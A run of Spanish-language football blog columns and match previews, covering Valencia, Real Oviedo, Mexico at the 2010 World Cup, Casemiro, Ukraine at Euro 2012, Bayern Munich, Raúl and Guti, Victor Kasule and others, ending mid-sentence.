Joaquín.Temporada 2010-11, 3-6. Y así llegamos al pasado inmediato, un partido que puede servir para entender por qué Emery, a pesar de sus indudables méritos, sigue siendo contestado en Mestalla con cierta frecuencia. No puede ser que un equipo que se juega la entrada en la Champions –objetivo de la temporada- salga con los brazos caídos ante otro con la Liga perdida y sin motivación conocida. Los suplentes de Mourinho crucificaron al Valencia, especialmente en un primer tiempo espléndido, y sólo un arreón final comandado por Juan Mata maquilló algo un resultado muy doloroso. El precedente estará muy presente esta noche cuando ruede el balón. A partir de las 22, en la Sexta.Compromiso y eficacia. Who ya gonna call? “Teléfono de la Esperanza, dígame. Le habla Edu Bedia”. En los momentos de ansiedad, bastó descolgar el aparato y dejar hablar al cántabro. Bedia produce un efecto en los partidos similar al de Susaeta, es un ansiolítico en pantalón corto. En cuanto relevó Omgba, futbolista muy apreciable a la hora de las tortas, el equipo agarró el partido por el mango. Le sigue faltando un puntito de ritmo pero de sus combinaciones precisas con Susaeta y Hervías nació el hilo de luz al que se aferró el Oviedo para rescatar un punto precioso. Receta tradicional, pases y controles para voltear la tortilla. Este Elche está fabricado para ir la guerra y creó peligro hasta el final, sobre todo cuando el cansancio trajo las imprecisiones, pero solo con Bedia en el campo se vio a un Oviedo ganador.Contar puntos y desgracias a estas alturas de liga es una tarea inútil. Propia de foreros. Es cierto que el Oviedo podría estar más arriba si borrásemos de la operación algún desajuste defensivo, pero las sensaciones que transmite pesan más. También los recursos de la plantilla y las decisiones de Egea. La suma da para ilusionarse. Con altibajos, como cualquier hijo de vecino en esta Liga Hummel igualada a la baja, pero el equipo progresa adecuadamente mientras va encontrando su sitio en el regreso al fútbol profesional. A los parroquianos de White Hart Lane, que siempre han bebido los vientos por los futbolistas de buen pie, los sesenta les debieron saber a gloria. Aparcaron en un rincón de la memoria treinta años en el ascensor, mandaron el yo-yo a freir espárragos y entraron en la década pidiendo pista. Inaugurando el primer periodo exitoso de su historia con el primer doblete doméstico que el siglo veinte trajo al fútbol inglés. Danny Blanchflower, Mackay y Greaves se lo montaban con mucho estilo. El acuñado por el míster Bill Nicholson. El mismo que aun contagia al que se enfunda la camiseta blanca y perdura en el imaginario colectivo de la hinchada. 62 y el 67 fueron años con Copa, 63 con Recopa y la UEFA del 72 cerró en oro los buenos viejos tiempos. Cómo sería la cosa al norte de Londres que hasta al lateral del equipo le fabricaban canciones de éxito. Aunque a los que vieron a Cyril Knowles peinando suavemente el carril izquierdo del Lane esto no les parece extraño… Sobre las posibilidades de México en el Mundial coincido con el escritor Juan Villoro, mexicano y escéptico para más señas, cuando afirma que El Tri no superará el umbral de octavos. Salvo que, como apunta con sorna Villoro, suceda un milagro cronológico en el que Cuauhtémoc Blanco rejuvenezca o Giovanni dos Santos llegue a la cima de golpe. El hincha mexicano es en cambio, caracter obliga, moderadamente optimista en solventar tan angosto paso. Un 53% de los encuestados recientemente por la presidencia de la República confiaban en ver al equipo que entrena Javier Aguirre en cuartos de final. Y un, ya mexicanísimo, 8% los veía en la final. Cosas poco probable ambas si tenemos en cuenta que México tan sólo han superado su ronda fetiche en una ocasión: hace  veinticuatro años y celebrando el Mundial, es un decir, en el salón de su casa. Sin embargo, surfeando la ola de optimismo y humo, el Presidente de la Federación Mexicana de Futbol, Justino Compeán, se ha comprometido publicamente a que el Tricolor llegará por lo menos a los cuartos de final en el Mundial de Sudáfrica 2010. Pero la ilusión de la hinchada es, en parte, comprensible por la idiosincrasia de la nación. El fútbol mexicano, negativo amplificado de lo que lleva ocurriendo en España desde que los balones son redondos, gira en torno a la selección nacional más que a los propios clubes. Un banco, refrescos varios, una cerveza, una compañía de transportes por carretera y una línea aerea o un snack de dudoso sabor, basta echar un vistazo a la vasta nómina de patrocinadores del combinado para entender que el dinero en México lo genera la selección. Hablamos de un país donde viven más de cien millones de personas, de una economía en franco crecimiento que pelea con Brasil, codo con codo, por asentarse como la tercera potencia de América. Hablamos de un pueblo que quiere ser actor destacado también en lo futbolístico.México llega al Mundial 2010 tras ceder la supremacía en su zona en favor de Estados Unidos. El gigante de la CONCACAF, que viene a ser como decir que uno es el tuerto en el país de los ciegos, hace tiempo que ve amenazado su tradicional dominio y en esta ocasión sólo pudo clasificarse como segunda de grupo. Y buena parte de culpa hay que echársela en el saco a Sven-Goran Eriksson. El sueco, capitán designado por la federación para llevar al barco a Sudáfrica, pasó por tierra azteca con más pena que gloria acumulando derrotas sonadas ante Honduras, Jamaica y Estados Unidos. Seis victorias, seis derrotas y un empatito fueron suficiente. Llegados a este punto el mundial se escapaba por la taza del retrete y el técnico, y lo que es más importante el reflejo de su trabajo, no convencían ni a la afición, ni a la prensa, ni a sus propios jefes. Entonces llegó Javier Aguirre.Fue clave el Vasco pero arrancó con derrota, y malos augurios. Patinó en El Salvador pero consiguió enderezar el rumbo de una tricolor que se encaminaba al desastre gracias a las importantes victorias cosechadas en Trinidad, Honduras Estados Unidos y Costa Rica para acabar certificando su pase en el majestuoso escenario del Estadio Azteca con una inapelable goleada, esta vez sí, ante El Salvador. A esas alturas la confirmación de Giovanni y el regreso, con rendimiento pese a vivir más en el ocaso que otra cosa, de Cuauthémoc Blanco ya eran razones suficientes para entender la comunión con el nuevo técnico. Criticado en ocasiones por su falta de ambición, Javier Aguirre ha sido el técnico que ha hermanado a la afición con el equipo. No sólo logró la clasificación sino que ha insuflado orgullo al equipo y al hincha con actuaciones tan señaladas como el espectacular 5-0 contra su némesis, EEUU, a domicilio y con la Copa de Oro en Juego. ¿Qué argumentos hay para aspirar a cuartos? Pocos. El equipo tiene que agarrarse con fe a la veteranía y oficio de Torrado y a la calidad de Carlos Vela, Guardado o el Chicharito Hernández, próximo jugador del Manchester United. El rendimiento de estos cuatro, especialmente de un Guardado que aglutina los mayores porcentajes de clase en el Tri, y lo que aun le pueda quedar dentro a un Cuauthémoc cada vez más próximo al retiro, marcarán el futuro de México en Sudáfrica. En suspense está lo que pueda aportar un Rafa Márquez cada vez más apartado del primer plano futbolístico y que ha visto empañada su aureola de kaiser por un par de expulsiones absurdas, que en México interpretaron como amor al club antes que a la bandera. Ya no es el capitán de antaño, tu capitán no puede ser el jugador más amonestado de la historia, pero debe aportar consistencia a la zaga. Arriba no hay dudas, Guille Franco será el encargado de transformar en frutos el desempeño de un once que se antoja insuficiente para aspirar a algo más que superar la primera fase.Lo mejor: Javier Aguirre. El cemento que ha unido afición, jugadores y al resto de estamentos. Genera ilusiónLo peor: Hay dudas en defensa, Márquez no es ni la sombra de lo que fue y faltará gol arriba para cumplir objetivos.Jugador más importante: Andrés GuardadoJugador a seguir: Chicharito HernándezPronóstico DDF: Lucharán con Uruguay y la anfitriona para meterse en octavos. El objetivo declarado de su federación son los cuartos aunque se me antoja complicado. A su favor juega el hecho de que el A es un grupo muy abierto con Francia en su peor momento y la incógnita de Sudáfrica.Los 23 mundialistas: Porteros:Defensas:Medios:Delanteros:Si el corsé logra sacar lo mejor de cada uno de los futbolistas, veremos el renacer de un equipo que corona, de nuevo este año, una temporada amarga.Lo mejor: El funcionamiento de algunos jugadores como Higuaín, Xabi Alonso o Albiol, base del futuro equipo.Lo peor: La poca claridad en el juego, la tibia aportación de Pellegrini a un plantel de calidad. “Odio eterno al fútbol moderno” es un ripio. Mal empezamos. En esta frase cabe de todo: una nostalgia sonrojante de treintañeros avejentados, una mitificación del fútbol pasado sin más información que la que escupe Twitter y se hojea en las Libero o las Panenka o el hooliganismo light a clubes que ahora penan en Tercera pero que estuvieron en Primera un par de temporadas hace veinte o treinta años.Ni el amor ni el odio pueden ser eternos. Mi ejemplo es Laudrup. Para otros será Luis Enrique. La maldad siempre cambia de bando, los amantes siempre se conocen de espaldas al mundo. Solo hay una cosa que me obliga, a veces, a pronunciar la frasecita que encabeza el artículo: la existencia del mediocentro defensivo. No su existencia, que entiendo que estuvo ahí desde siempre, sino la sensación de que es la base del equipo, su sustento. El mediocentro defensivo es al fútbol moderno lo que el tofu a los veganos, lo que el pedrolo a los cocainómanos, lo que el puro a las bodas, lo que el 2×1 a las viejas que moran acampadas en las orillas de la sección de congelados.Casemiro fue el mejor del Madrid he llegado a leer, tras el chaparrón vigués. El destructor como base de la creación, ese sinsentido que es este deporte. Desde que el fútbol es fútbol -es decir, desde el Milan de Sacchi– se sabe que la mejor manera de defenderse es: tener el balón y moverlo cerca del área rival. El pivote, el stopper, como lo llaméis, nace del complejo. Del terror, del atavismo. Como las cerraduras dobles y las puertas blindadas, como el poliamor y el Tinder, como la colorida pero melancólica ropa del Desigual. Todo lo malo surge del miedo a perder, del miedo a los demás, de la celebración de la propia inferioridad. Casemiro y Kovacic fueron el eje sobre el que giró el Madrid del 7-1 a un Celta desdibujado. En la derrota contra el Atlético en su posición estaban Modric y Kroos. Conclusión: los buenos son los primeros, con los segundos el Madrid hace aguas. Disfrutemos de la anécdota, hagamosla ley, coronemos al centro brasileño como nuevo rey.El medio defensivo es al fútbol lo que Quique González es a la música disco. Todas las bajonas pasan por su posición: Emerson y Diarra son la miseria existencial. Una vez que el 4-3-3 ha vencido al 4-4-2 en los equipos más poderosos del planeta, debemos asumir que tener tres centrocampistas no obliga a mandar alguno de ellos a galeras. Busquets es el paradigma para lo bueno, para lo malo están Gravesen, Pablo García o Lucas Silva. Por decir tres jugadores incapaces de subirse las medias, fácil imaginarlos equilibrando al Madrid de las noches europeas. Es falso que un jugador especializado en el corte sea necesario, es falso que sea imprescindible para sustentar al equipo, hay más de mitología en la posición que de argumentario futbolero, ¿tanto tiempo hace que Redondo se marchó de vuestros corazones?En un equipo con Modric, James, Isco o Kroos; me parece una pijada decir que el bueno es Casemiro. Ese futbolista trotón y reservado, de enorme cabeza y cintura de John Deere que por lo visto es la pieza que le faltaba a Zidane. A Zidane que levantó la Copa de Europa con Makelele a su lado, que creció custodiado por Di Livio, que logró ser campeón del Mundo con Petit a su vera. Como esas tías de pasta a las que les parecen cool los bares de barrio con pringue en la barra y vasos ahumados, y los visitan como quien va a un museo de lo mundano. Así me siento viendo a Casemiro, como un hallazgo lumpen proletario entre salones dorados. Como los grunge de La Salle o las malotas de las Teresianas.Quiero mi propio mapa de calor como aficionado. Cómo empiezo en verde en el sofá de casa y acabó de colorado dando paseos por el salón, comiendo pipas y maldiciendo a cada uno de los jugadores que Zidane ha puesto sobre la hierba. Quiero mi propia estadística de cáscaras encestadas en el bol. Quiero todos esos datos intrascendentes que tratan de explicar con porcentajes y kilómetros lo que el propio encuentro nos enseñó: que al Madrid le falta juego y no destrucción, que volvemos a las lagunas defensivas y falta un central de calidad que mejore a Ramos y devuelva a Pepe al banquillo, que Cristiano Ronaldo juega su propio partido sin sumar en lo colectivo, que Mayoral podrá ser un gran delantero en el futuro pero que hoy sea el sustituto de Benzema debería abochornar a un club como el Real Madrid.Llega el lunes y hablamos de Casemiro, del equilibrio que aporta a este Madrid en recuperación.No es muy conocido su nombre para las nuevas generaciones, pero René Mercet fue el árbitro suizo encargado de dirigir el desempate en cuartos de final en Italia 34′ entre el anfitrión y España. La Furia se había presentado con uno de los mejores equipos de su historia –Zamora, Quincoces, Lángara, Gorostiza-, había tumbado a Brasil y logrado el empate a uno con los transalpinos (vídeo) en un encuentro durísimo. El replay, según todas las crónicas, fue decidido por la parcialidad del árbitro, que anuló sin motivo tantos de Regueiro y Quincoces y concedió el logrado por el legendario Meazza tras arrollar al arquero español. La cosa fue tan flagrante y vergonzosa, que Mercet fue automáticamente expulsado de la federación suiza y de la FIFA, y no volvió a arbitrar partido alguno. Y es que la sombra de Mussolini era muy larga. España ha puesto punto final a su primera temporada como campeón del mundo con un triunfo en Venezuela obtenido más por la vía pragmática que por la estética. Gente como Iraola, Marchena o Arbeloa certificaba que Del Bosque planteaba este encuentro para dar minutos y hacer un poco de grupo; justo lo contrario que su rival, que quizá excitado por las soflamas de su caudillo, salió fuerte y decidido a defender el honor venezolano. Sin embargo, la diferencia competitiva es demasiado grande, y a la Roja le bastaron dos friquis de Villa y Xabi Alonso en el primer tiempo y un buen tanto de Pedro en el medio de ambos, para cerrar un partido que manejó con toque intrascendente y nunca se tomó demasiado en serio. Del otro lado queda la verticalidad de Orozco, lo agradable que se hace siempre volver a ver a Arango, y una dignidad indiscutible ante un adversario superior que quizá hizo merecedora a la Vinotinto del tanto que hubiera sido, nunca mejor dicho, el del honor. Lo impidió Valdés, tan brillante esta noche como el resto de la temporada. Para el inventario queda la presencia testimonial de Iker en su partido número 121 como internacional, y el debut de Manu del Moral; se hizo curioso ver coincidir al andaluz con Miku, su compañero en la vanguardia del Getafe aunque hoy llevasen camisetas diferentes. Esos guiños que siempre nos deja el fútbol. “América me lo ha dado todo”. Así comienza El Padrino, con una aparente declaración de intenciones que pronto gira en monstruosa ironía. Necesitando presentar a su personaje principal de la forma más efectiva y directa posible, Mario Puzo encabezó novela y guión con una escena inolvidable, en la que un desventurado funerario acude a Vito Corleone para pedir justicia para su hija; una justicia que le niegan las instituciones oficiales, asoladas por la corrupción, el amiguismo y la prevaricación. La primera imagen que recibimos del Don es la de un hombre bondadoso, amigo de sus amigos, que pasa por encima de su orgullo cuando se trata de ayudar a quien nadie más puede hacerlo. La perversión del habitual punto de vista resulta brillante, pero la escena puede interpretarse en clave más aséptica, y seguramente más real: si la Justicia no es justa, el sistema se vicia, acaba hundiéndose y llega el turno del mafioso.Lo que le cuenta Bonasera a Corleone –la violación de su hija por unos chavales muy bien relacionados- lo vimos reproducido punto por punto hace unos meses: sólo cambiaba el nombre de la víctima, Oksana, y el lugar del delito, Kiev. Cuando la chica falleció víctima de la gasolina con la que le rociaron y los culpables –de nuevo bien relacionados- salieron a la calle, rompió una ola de indignación internacional, tan intensa como breve. En ese periodo conocimos que lo ocurrido con esta joven no era la excepción, sino la regla, en un país que presenta uno de los índices de corrupción más altos de Europa. Un lugar donde la antigua primera ministra, Julia Tymoshenko, es encerrada por “justicia selectiva por motivaciones políticas” (cita de la UE) y luego apaleada salvajemente en la cárcel. Donde el racismo es común en los estadios. O donde un diputado es puesto en libertad después de matar a tiros, delante de su mujer y su hija, a un hombre que había cometido la terrible falta de bañarse junto a él. Por supuesto, las organizaciones internacionales no han escatimado durísimas medidas de coerción para que estas situaciones no se repitan en un futuro. La primera, la más eficaz, otorgar a Ucrania la organización de un gran evento internacional, una medida aplicada con gran éxito en el pasado en lugares y fechas como Italia 34, Berlín 36 o Argentina 78. Siempre imparables en su defensa de los derechos humanos, el Parlamento Europeo ha llegado al extremo de enviar incluso una delegación para que investigue los hechos “sobre el terreno”. Y en el colmo de la severidad y la intransigencia hay incluso algunos políticos que han amenazado con no ir a los partidos mientras Tymoshenko siga encarcelada. No sabemos si los que van harán huelga de hambre de canapés en los palcos, quizá la última medida que falta para obligar a los dirigentes del país a volver a la senda de la rectitud. Cuando terminen de reírse, por supuesto.Es una pena esta situación tan deplorable en un país que le ha dado tanto al fútbol, y que sin duda desde este punto de vista sí que merecía una Eurocopa. En Ucrania tuvo lugar la tremenda historia que inspiró Evasión o Victoria (ahí está el estupendo libro de Marañón que lo cuenta con pelos y señales), ha alumbrado a futbolistas como Blokhin, Baltacha, Rebrov, Shevchenko, Rats, Yakovenko, Yuran o Zavarov, y allí fue donde el visionario Valeri Lobanovski convirtió al Dinamo de Kiev en uno de los clubes más grandes de Europa, a lo largo de varias épocas donde lo más invariable fue el temor que inspiraba. Que se lo cuenten al Atlético de Madrid, víctima en 1986 de una de las mayores exhibiciones jamás realizadas en una final continental. Pocas veces un 3-0 fue tan corto.Precisamente el héroe de aquella noche, Oleg Blokhin, es el encargado de llevar las riendas de la Zbirna en la cita más importante de su corta historia. El espejo es el Mundial de hace seis años, cuando supieron reponerse de la tunda que le suministró España para alcanzar los cuartos de final; sólo el campeón pudo eliminarlos. La plantilla de la que dispone hoy el que fuera Balón de Oro es sensiblemente inferior a aquel equipo, y hasta diez de sus jugadores pueden llegar tocados por la fenomenal intoxicación alimenticia sufrida hace poco en Ingolstadt. Más allá, por supuesto, de las extemporáneas declaraciones del seleccionador hablando del sabotaje, y que más bien sólo hablan de nervios e inseguridad.La realidad es que Blokhin no tiene demasiado de donde tirar. Los futbolistas con nombre en el futbol europeo –Sheva, Tymoschuk, Voronin– no cumplen ya ninguno los veinte años, y todos vienen de vuelta, mientras que las jóvenes promesas como Rakitskiy o Yarmolenko aún no han salido a foguearse fuera de Ucrania para mostrar el potencial que atesoran. Quizá el único futbolista de primer nivel que se encuentra en la edad ideal es el ariete Artem Milevski, pero su irregularidad lo está llevando más por el camino de las eternas promesas que por el de los jugadores realmente decisivos. Con 27 años, aún está a tiempo de decidir su destino.Para empezar, hay un problema en la portería. El veteranísimo Shovkovsky –que tampoco fue nunca Yashin- se cayó de la convocatoria por un problema en el hombro, así que lo sustituirá Pyatov, una opción bastante poco fiable. Tampoco estará Chigrinsky, y su puesto en el centro de la zaga seguramente será para Alexander Kucher, un defensa muy duro; la clase la aportará Rakitskiy, a quien ya conocemos bien por sus partidos en Champions con el Shakhtar. El lateral izquierdo se lo discutirán Selin y Shevchuk, mientras que en la derecha será fijo Bohdan Butko, un carrilero bastante veloz que saldrá pronto del modesto Ilichivets. En el medio es fijo el veterano Tymoschuk, y su acompañante saldrá casi seguro de la dupla Rotan–Aliyev, dependiendo de si el entrenador se inclina por el doble pivote o por el rombo.En las alas son fijos Yarmolenko y Konoplyanka, quizá a día de hoy los futbolistas más desequilibrantes del equipo, y arriba falta por decidir el acompañante de Milevski, que casi seguro que no será Sheva, fuera de forma. Veremos al mito en los segundos tiempos.Estos son principales mimbres con los que contarán los amarillos, y su rendimiento es una incógnita. Sí puede asegurarse que es una escuadra inferior a la de 2006, pero también es cierto que su grupo no es el más complicado y que la condición de local sí que suele contar. El primer partido, contra Suecia, dirá muchísimo.Alineación probable: Pyatov;Selin, Kucher, Rakitskiy, Butko; Tymoschuk, Rotan, Nazarenko, Yarmolenko; Milevski y Voronin.Pronóstico: Dado el nivel de Inglaterra actual, las posiblidades de Ucrania de pasar no son muy inferiores a las de los pross, ni por supuesto a las de Suecia. Resulta difícil, en cambio, imaginarlos más allá de un cuarto de final que los enfrente presumiblemente a Italia o España. Sólo esto ya constituiría un gran éxito. Cuanta más clásico es un club y más solera posee, más posiblidades hay de algunos tópicos se asienten y acabe convirtiéndose en lugares comunes para describir su situación  en cualquier instante de tiempo. No es casualidad, sino la repetición de pautas que se asientan, de forma más o menos afortunada, como señas de identidad, y en ocasiones terminan motivando conductas y líneas de actuación dentro de la propia institución, amén de condicionar la mirada desde la que se lo analiza. Pocos tópicos hay más repetidos que afirmar que todo tópico tiene su parte de verdad.Tomemos, por ejemplo, el Bayern Munich. Si evocamos la imagen mental que casi todos poseemos del club bávaro, encontraremos características positivas que en parte explican su ingente poderío y maravilloso historial. Pensamos en estupendos jugadores vestidos de rojo refulgente, quizá alemanotes, quizá anomalías foráneas o sutiles, que en un buen día te pasan por encima, sea la Copa de Europa o un torneo de verano. Una bestia parda que domina el fútbol alemán en todos los sentidos –trofeos, economía, fichajes-, liquida la Bundesliga en un santiamén y se presenta con frecuencia en las últimas rondas de los torneos continentales. Enemigo temible que nadie desea enfrente.También hay otro tipo de lugares comunes que se asocian a esta institución, menos favorables, menos halagüeños. Un equipo odiado en el resto de Alemania por su canibalización de los demás equipos. Jugadores de ego gigantesco que acaban sacando sus trapos sucios fuera del vestuario, directivos que dejan salir las declaraciones más extemporáneas, entrenadores ninguneados, impotentes para dominar al monstruo que tienen entre manos. Momentos muy malos, de vergüenza ajena, efectos secundarios de una concentración excesiva de competitividad y carácter. Desplomes sorprendentes.Por desgracia para la vasta masa social de seguidores del tetracampeón de Europa, la temporada ha mostrado las dos caras del club, y la de estos días es con diferencia la menos amable. En octubre todo marchaba sobre ruedas; Mario Gómez era una trituradora, Ribéry había vuelto de las tinieblas, el equipo despedazaba rivales como en sus mejores tiempos, en menos de nueve jornadas había abierto una brecha de cinco puntos y la tarjeta de goles, 25-1, hablaba más de abuso que de autoridad. Cinco meses después, la Bundesliga está prácticamente perdida, el ambiente es el de un corral, con Rummenigge echando broncas, futbolistas enfrentados en público y Robben diciendo que se quiere ir, y la amenaza de despedirse de la Champions –cuya final se juega en el Allianz- a la vuelta de la esquina. Motivos ha habido para el derrumbe, pero quédense con uno: la clavícula de Schweinsteiger, rota en pedazos en un partido contra el Nápoles. El efecto fue similar al que produciría en el Barcelona una lesión de Messi o en el Madrid otra de Xabi Alonso Un hundimiento.Basti está volviendo poco a poco –pasó también una lesión de tobillo- y el Bayern olvidó sus penas el fin de semana abusando de un pobre Hoffenheim (7-1). Hoy le espera el Basilea, bestia negra del Manchester United, quizá el modesto que mejor juega del fútbol europeo, y cuyos jugadores vivirán hoy el momento más exigente de sus carreras. Un partido mayúsculo, pues, donde la gran atracción será Shaqiri, estrella del equipo suizo y ya fichado para el año que viene por su rival de hoy. Veremos si los azulgrana doman a la bestia, o se impone la Historia. En la ida, 1-0. Corría el mes de junio, y el ambiente que rodeaba al Real Madrid era de desilusión, confrontación y hastío. Entre la Liga justamente ganada por el Barcelona, una parte importante de la afición enfrente de Florentino Pérez por culpa del indaucido despido de Pellegrini y la sensación general de estar viviendo la misma película de los últimos años –una película sin final feliz- dos despedidas pasaban, si no desapercibidas, mucho más de puntillas de lo que merecía la entidad de los dos personajes que abandonaban la Casa Blanca. Raúl González y José María Gutiérrez, que con esos nombres igual podían pasar por futbolistas del Madrid que por chapistas en Moratalaz o camareros en Alcobendas, se marchaban tras haber pasado gran parte de su vida en alguna de las dos orillas de la Castellana, y tras haber dejado en el club blanco y en el fútbol español improntas tan hondas como diferentes.Raúl se marcha tras una carrera larguísima en el Madrid que, en un detalle de cierto regusto budista, se abrió y cerró en el mismo lugar, la Romareda. En el medio, un periodo que abarca la adolescencia y juventud de buena parte de todos nosotros, hubo tiempo para todo; pocos personajes han provocado tantos ríos de tinta como el chaval de la Colonia Marconi que en unos años gloriosos que casi nadie le discute llevó al Madrid de vuelta a un cetro europeo que llevaba más de treinta años sin oler. Sin embargo, inesperadamente, a una edad en la que la mayor parte de los futbolistas alcanzan su plenitud, Raúl inició un lento declive en el que, más rápido que sus promedios goleadores, descendió su influencia en el juego. Del futbolista casi total de su primera época, que aunaba pase, visión de juego, capacidad de sacrificio, regate y todos los recursos posibles de cara al gol, se pasó lentamente a un jugador que a ratos parecía una caricatura de sí mismo, agarrado al oportunismo que nunca perderá, a alguna acción brillante o aislada, o a esas carreras cortas, a ratos emocionantes, a ratos equidistantes de la desesperación y la demagogia. Con una imagen tristemente dañada para mucha gente que no conoció sus mejores años, y víctima de rumores y habladurías que difícilmente sabremos si fueron fundados o no, Raúl decidió este año que ya bastaba, y que se merecía unos últimos años tranquilos donde disfrutar del aprecio casi unànime que aun disfruta fuera de nuestras fronteras, ese triste territorio de la discordia entre raulistas y antirraulistas. Se fue, al menos, con dos medallas que nadie podrá quitarle: la de la profesionalidad intachable dentro del campo, donde siempre lo dio todo, y la de jamás haber recibido una tarjeta roja en los cientos de partidos jugados de blanco.Con todos los matices que queramos, no estaremos lejos de la verdad al afirmar que Guti fue lo contrario de Raúl en muchas cosas; quizá sólo coincidieron en la fecha de llegada y salida, en el club y en haber dejado un puñado de partidos indelebles en la memoria de los aficionados. Si Raúl fue el empeño de mejora día a día, y según le respondió el físico acabó convirtiéndose –en frase de un afamado comentarista deportivo- en un ocho en todo, Guti traía de fábrica una pierna izquierda y un entendimiento del juego de esos que forjan los dioses en sus ratos de ocio. Sus filigranas y jugadas imposibles ya las hacía en el Castilla siendo un tirillas melenudo, y ese mismo espíritu quedó recogido en su epitafio en el Madrid: ese taconazo nunca visto frente a Aranzubía, que recoge todo lo mejor de un futbolista genial, creativo, valiente y descarado. Lo peor lo fuimos descubriendo a lo largo de los años, una colección de desplantes, ausencias, lesiones sospechosas y juergas sin fin que se han acabado sobreponiendo en el imaginario popular al surtido de pases imposibles y situaciones desesperadas en la que la solución “sacar a Guti” era tradición en el Bernabéu y elixir de la vida. Héroe maldito o eterna promesa, qué mas da.La cuestión es que los dos se han ido, y el vacío que han dejado –bendito o maldito según el punto de vista- será difícil de llenar. Raúl apostó por la seriedad de la Bundesliga en un club simpático con gen perdedor, y está empezando a triunfar –tras unos meses para olvidar- como un Sísifo que, a base de insistencia, consiguiera por fin subir la piedra al monte. Ya no es el Ferrari, es Señorrr Raúl, como aclaman los hinchas del Ruhr. Guti, en cambio, arribó a Estambul en olor de multitudes, y a pesar de las pinceladas marca de la casa, la triste foto suya que ha dado la vuelta al mundo lo representaba borracho, al volante de un cochazo en el que estuvo a una pulgada de matarse. Perfectos contrastes que definen lo que han sido estos dos futbolistas que, estén donde estén, nos tendrán siempre con un ojo posado en ellos. Para bien o para mal, historia de nuestro fútbol.“No soporto el vodka. Si me hubieran llamado Brandy Vic hubiera sido otra cosa”Debería darme vergüenza escribir sobre un futbolista al que jamás he visto jugar y del que ni siquiera tengo ese 71 de regate en el FIFA al que agarrarme. No debería, no, pero el cromo me obligó. Porque era escocés pero negro como el tizón, porque tuvo su momento en el infrafútbol de los ochenta, porque a Victor Kasule, que abundaba en el regate tanto como en la barra, le llamaban Vodka Vic.Hijo de un zoólogo ugandés y una profesora escocesa, Kasule siempre fue extremo dentro y fuera del campo. Vodka Vic trabajaba a tiempo completo. En un mismo día podía ganar al Leeds con un gol maestro y seguidamente lesionarse celebrando la proeza a base de volteretas. Dicen que destrozó al Crystal Palace de Ian Wright y que acabó el día expulsado por susurrarle al árbitro una canción de George Benson. Vic podía mantener el equipo en segunda con la gorra y volcar el coche de un compañero por embalarse más de la cuenta yendo a comprar más cervezas.Kasule es leyenda en Shrewsbury desde el primer día en que llegó a mediados de los ochenta. Tras desparramar su clase intermitente durante más de 130 partidos en Escocia, apareció para besar el santo y todo lo que se le puso por delante. Y hay que reconocerle el mérito, porque cualquiera puede ahogarse en los encantos de París, Madrid o Londres pero hace falta una sensibilidad especial para destrozar tu carrera en las cuatro tabernas de un pueblo de mala muerte. Victor Kasule iba sobrado de ese talento. “No pasa un día sin que me diga a mí mismo “maldita sea, maldita sea, maldita sea”, solía lamentar.El hombre entendía la formalidad a su manera. “He fichado equipos completos más rápido que a Víctor Kasule”, declaró el director técnico del Hamilton Academicals justo antes de consumar su fichaje. Kasule había  viajado hasta Glasgow para firmar olvidando la documentación en casa. Su nuevo club le envío de regreso a Shrewsbury para que los recogiera pero con la mosca detrás de la oreja, tal era la fama que le precedía. “Victor Kasule es ahora nuestro jugador, a menos que desaparezca entre Shrewsbury y aquí, pero hemos puesto un conductor con él para asegurarse de que regrese”. El Guardian le definió como un coche blindado con un cañón en la bota. El tipo todavía sostiene que nunca bebió más que cualquiera de sus compañeros de la época pero fueron sus hazañas tras la barra las que le han asegurado un lugar en el bestiario británico. Como cuando un periodista se lo encontraró muy de mañana en un bar del pueblo, jurando y perjurando que en su vaso había zumo de naranja mientras trataba de mantener la verticalidad. “El Shrewsbury era un club familiar e hicimos todo lo posible para arruinar esa reputación”, declaró en un arrebato de sinceridad.Tras arrastrarse por  Finlandia, Malta. Irlanda y Portugal, las delgadas piernas de Kasule dejaron de regatear laterales antes de cumplir los treinta, limadas por las lesiones y el castigo en los taburetes de media Inglaterra. Para entonces ya tenía unas cuantas historias que contar y un epitafio que podrá ilustrar su tumba y la de muchos. “Me gustaría ser recordado solo como un futbolista, pero si me recuerdan también como un borracho mejor que no ser recordado por nada” Maleta con la pegatina de Manchester colocadita, uno observaba la españolísima anatomía de David Silva antes de que partiese a Inglaterra y dudaba realmente de que la aventura por el árido fútbol inglés fuese a llegar a buen puerto. Más aun cuando se iba a desarrollar en el frecuentemente ofuscado centro del campo del Manchester City.Ahora, en el arranque de su segundo curso como emigrado, Silva es el principal responsable de que el club celeste despida algo más que tufo a petrodólar. Silva es el generador de toda opción en el musculoso Manchester City y por encima de los que aconsejan solo centrocampistas ingleses para jugar en Inglaterra, ahí están las millonadas que se están despachando allí por cromos de pie ciertamente limitado, Silva se ha impuesto a pura clase. Y algo similar puede ocurrir con Juan Mata.El asturiano llega a un Chelsea con el mismo cuadro clínico,  la misma carencia de sustancia, que presentaba el Manchester City antes de que ese paladín del fútbol sámba que atiende por Roberto Mancini se decidiera a garabatear el nombre del canario en su pizarra. En los azulones no sobra el octanaje pero falta el control. Evidentemente hay talento diferente en el verde, ahí están los destellos ilusionantes de Torres y la promesa de Josh McEachran sobre el tapete, pero falta el futbolista afilado que pueda dar el pasito al siguiente peldaño. En su día se habló del Tottenham, el equipo equipo de juego aseado que posiblemente le viniese como anillo al dedo al ex-valencianista, pero él agarró el camino difícil. Le criticarán los puristas del box to box, posiblemente vigilarán sus tackles con lupa a la caza de una debilidad, pero salvo catástrofe y como ha acabado ocurriendo con Silva, Mata se impondrá con la calidad por bandera. Lo digo ahora, Mata se va a marcar un Silva. Rizos en el flequillo y en cada balón que escupía su bota izquierda. Roberto Fabián Pompei con cuerpo de panadero y vocación por cocinar roscones para endulzar la tarde. Sí, lo del Tito era la rosca. Maradona exigió a Boca que no lo vendieran y en Buenavista nos creíamos el halago porque podíamos. Porque le vimos jugar a ratitos durante tres años. Cuando no le pesaban los calzones el argentino del pecho palomo era grande y nos importó bien poco que aquel piropo lo tirara la versión obesa, teñida y desquiciada del mito. El Tito Pompei ‘one hit wonder’; el Tito al que mis amigos y yo tuvimos que buscarle un apodo más, ‘La Crema’, porque de puro bueno no nos alcanzaba con el que traía de fábrica. La camiseta que llevaba un padre de familia el otro día en la grada de algún campucho del infrafútbol y llena de orgullo al que la mira. El Tito Pompei del golazo al Mérida es un jugador que ya no importa. Hace un tiempo, en plena efervescencia de la campaña de acoso y derribo que el diario Marca estaba llevando a cabo contra el por entonces jefe del vestuario madridista Manuel Pellegrini, escribí un artículo titulado “La murga que no cesa” en el que critiqué a la enfermiza querencia de dicho medio por travestirse en departamento de recursos 